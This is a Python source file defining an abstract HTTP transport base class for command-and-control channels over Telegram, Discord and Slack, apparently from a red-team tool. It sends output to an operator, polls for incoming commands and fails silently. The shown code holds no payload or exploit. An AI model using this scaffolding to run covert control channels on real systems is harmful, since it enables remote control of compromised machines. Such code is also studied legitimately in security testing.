"""HTTP transport base for C2 channels.

One concern per class: the base owns the wire I/O (``requests``), the
poll cursor and the fail-soft contract; platform subclasses only build
requests. Nothing here imports ``lazyc2`` or the CLI shell — command
execution stays with the injected executor strategy.
"""

from __future__ import annotations

import logging
import time
from collections.abc import Callable
from typing import Any

import requests

from core.protocols import C2Message

_log = logging.getLogger(__name__)

POLL_LIMIT_DEFAULT = 10
POLL_INTERVAL_SEC = 1.0
SEND_TIMEOUT_SEC = 10.0
POLL_TIMEOUT_SEC = 15.0


class HttpC2Channel:
    """Request-driven C2 channel base class (transport only).

    Attributes:
        name: Channel identifier (``telegram``/``discord``/``slack``).
        configured: False when the platform credentials are missing; the
            channel then fails every operation silently.
    """

    name = "base"
    _poll_interval = POLL_INTERVAL_SEC

    def __init__(self, config: dict[str, Any]) -> None:
        self._config = config
        self.configured = self._resolve_credentials()
        self._last_poll = 0.0

    def _resolve_credentials(self) -> bool:
        """Bind platform credentials from the payload; False when missing."""
        raise NotImplementedError

    def _send_request(self, text: str) -> requests.Response:
        """Build and perform the outbound send request."""
        raise NotImplementedError

    def _poll_request(self, limit: int) -> list[C2Message]:
        """Build and perform the inbound poll; return the new messages."""
        raise NotImplementedError

    def send(self, text: str) -> bool:
        """Deliver one outbound message to the operator.

        Args:
            text: Message text (truncated at 3900 chars platform-side).

        Returns:
            True on HTTP 2xx, False on errors, missing credentials or
            blank input.
        """
        if not self.configured:
            return False
        payload = str(text or "").strip()
        if not payload:
            return False
        try:
            response = self._send_request(payload[:3900])
            return 200 <= response.status_code < 300
        except requests.RequestException as exc:
            _log.debug("[%s] send failed: %s", self.name, exc)
            return False

    def poll(self) -> list[C2Message]:
        """Return the new inbound messages since the previous poll.

        Rate-limited to one platform request per ``_poll_interval``
        seconds; every error yields an empty list (fail-soft).
        """
        if not self.configured:
            return []
        now = time.monotonic()
        if now - self._last_poll < self._poll_interval:
            return []
        self._last_poll = now
        try:
            return self._poll_request(POLL_LIMIT_DEFAULT)
        except (requests.RequestException, ValueError, KeyError) as exc:
            _log.debug("[%s] poll failed: %s", self.name, exc)
            return []


def message(channel: str, sender: str, text: str) -> C2Message:
    """Build a :class:`C2Message` with blank text dropped upstream."""
    return C2Message(channel=channel, sender=str(sender), text=str(text or ""))


def default_transport() -> Callable[[], Any]:
    """Return the requests module accessor for test injection seams."""
    return requests
